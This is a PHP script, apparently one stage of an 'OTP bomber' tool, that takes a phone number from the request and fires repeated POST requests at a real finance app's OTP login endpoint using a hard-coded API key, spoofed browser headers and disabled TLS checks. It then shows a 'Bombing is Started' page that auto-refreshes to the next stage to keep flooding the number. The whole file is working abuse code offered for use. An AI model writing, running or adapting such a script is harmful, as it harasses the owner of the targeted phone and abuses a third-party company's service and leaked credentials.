
<?php 


$mobno=$_REQUEST['mobno'];

	
 $data='{"mobile":"'.$mobno.'"}';
 $url="https://api.sqrrl.in/v1/auth";
         //header here
        $headers   = array();
        $headers[] = "Host:api.sqrrl.in";
        $headers[] = "content-length:23";
        $headers[] = "accept:application/json, text/plain, */*";
        $headers[] = "api-key:ff51f9ee81f8424fa9304a8722f88307";
        $headers[] = "app-version:3.1.0";
        $headers[] = "user-agent:Mozilla/5.0 (Linux; Android 9; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36";
        $headers[] = "content-type:application/json;charset=UTF-8";
        $headers[] = "origin:https://app.sqrrl.in";
        
        $headers[] = "Sec-Fetch-Site:same-site";
        $headers[] = "Sec-Fetch-Mode:cors";
        $headers[] = "Sec-Fetch-Dest:empty";
        $headers[] = "referer:https://app.sqrrl.in/otp-verification";
        $headers[] = "Accept-Encoding:gzip, deflate, br";
        $headers[] = "Accept-Language:en-US,en;q=0.9";

        //end headers and function start
         $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        $result = curl_exec($ch);
        curl_close($ch);
    

 $data1='{"mobile":"'.$mobno.'"}';
 $url1="https://api.sqrrl.in/v1/auth";
         //header here
        $headers   = array();
        $headers[] = "Host:api.sqrrl.in";
        $headers[] = "content-length:23";
        $headers[] = "accept:application/json, text/plain, */*";
        $headers[] = "api-key:ff51f9ee81f8424fa9304a8722f88307";
        $headers[] = "app-version:3.1.0";
        $headers[] = "user-agent:Mozilla/5.0 (Linux; Android 9; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36";
        $headers[] = "content-type:application/json;charset=UTF-8";
        $headers[] = "origin:https://app.sqrrl.in";
        
        $headers[] = "Sec-Fetch-Site:same-site";
        $headers[] = "Sec-Fetch-Mode:cors";
        $headers[] = "Sec-Fetch-Dest:empty";
        $headers[] = "referer:https://app.sqrrl.in/otp-verification";
        $headers[] = "Accept-Encoding:gzip, deflate, br";
        $headers[] = "Accept-Language:en-US,en;q=0.9";

        //end headers and function start
         $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        $result = curl_exec($ch);
        curl_close($ch);
    



    
   $rl="bomb1.php?mobno=".$mobno."";
   ?><body style="background: black;"> <center>
       
       <font style="color: white;font-size: 28px;font-family: Mv Boli">
           Bombing is Started ...<br>
           Our server Can Send Call in every one minute ..<br>
           stay on the page ..<br>
           or minimize the browser ..<br>
           but Don't Close Tab..<br>

           Thanks For Visiting.........<br>
       </font>

   </center></body><?php
	echo '<META HTTP-EQUIV=REFRESH CONTENT="50; '.$rl.'">';
	//header("location:2.php?sent=".$sentinc."&&count=".$count."&&mobno=".$mobno);

?>
